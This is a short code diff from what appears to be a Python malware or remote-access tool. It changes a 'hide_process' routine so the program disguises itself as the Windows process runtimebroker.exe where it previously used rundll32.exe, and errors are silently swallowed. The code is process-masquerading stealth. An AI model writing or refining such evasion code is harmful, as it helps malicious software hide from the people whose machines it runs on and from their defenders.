@@ -262,11 +262,11 @@ def start_http_server():
     except:
         pass
 
-# Hide process by mimicking rundll32.exe
+# Hide process by mimicking runtimebroker.exe
 def hide_process():
     try:
         for proc in psutil.process_iter(['name']):
-            if proc.info['name'].lower() == 'rundll32.exe':
+            if proc.info['name'].lower() == 'runtimebroker.exe':
                 os.environ['COMSPEC'] = proc.exe()
                 break
     except:
